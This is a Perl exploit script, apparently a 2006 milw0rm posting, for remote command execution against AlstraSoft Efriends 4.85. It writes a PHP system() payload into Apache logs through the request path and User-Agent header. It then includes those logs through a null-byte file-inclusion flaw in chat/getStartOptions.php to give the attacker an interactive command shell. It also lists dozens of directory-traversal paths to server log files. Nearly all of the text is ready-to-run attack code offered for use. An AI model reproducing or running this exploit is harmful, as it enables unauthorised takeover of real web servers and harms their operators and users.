#!/usr/bin/perl
#
# AlstraSoft Efriends 4.85 Remote Command Execution Exploit
# Site : http://www.alstrasoft.com/efriends.htm
#
# Coded by Kw3[R]Ln from Romanian Security Team a.K.A http://RST-CREW.NET
# Contact: ciriboflacs@yahoo.com or kw3rln@rst-crew.net
#
# PS: fuck CarcaBot ..another lame romanian guy=))


use IO::Socket;
use LWP::Simple;

#ripped from rgod
@apache=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../.. /../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);

print &quot;[RST] AlstraSoft Efriends 4.85 Remote Command Execution Exploit\n&quot;;
print &quot;[RST] need magic_quotes_gpc = off\n&quot;;
print &quot;[RST] c0ded by Kw3[R]Ln from Romanian Security Team [ http://rst-crew.net ] \n\n&quot;;


if (@ARGV &lt; 3)
{
    print &quot;[RST] Usage: efriends.pl [host] [path] [apache_path]\n\n&quot;;
    print &quot;[RST] Apache Path: \n&quot;;
    $i = 0;
    while($apache[$i])
    { print &quot;[$i] $apache[$i]\n&quot;;$i++;}
    exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print &quot;[RST] Injecting some code in log files...\n&quot;;
$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);
print &quot;[RST] Shell!! write q to exit !\n&quot;;
print &quot;[RST] IF not working try another apache path\n\n&quot;;

print &quot;[shell] &quot;;$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;q&quot;) {
    $socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;
    
    print $socket &quot;GET &quot;.$path.&quot;chat/getStartOptions.php?lang=&quot;.$apache[$apachepath].&quot;%00&amp;cmd=$cmd HTTP/1.1\r\n&quot;;
    print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
    print $socket &quot;Accept: */*\r\n&quot;;
    print $socket &quot;Connection: close\r\n\n&quot;;    
    
    while ($raspuns = &lt;$socket&gt;)
    {
        print $raspuns;
    }
    
    print &quot;[shell] &quot;;
    $cmd = &lt;STDIN&gt;;    
}

# milw0rm.com [2006-09-18]
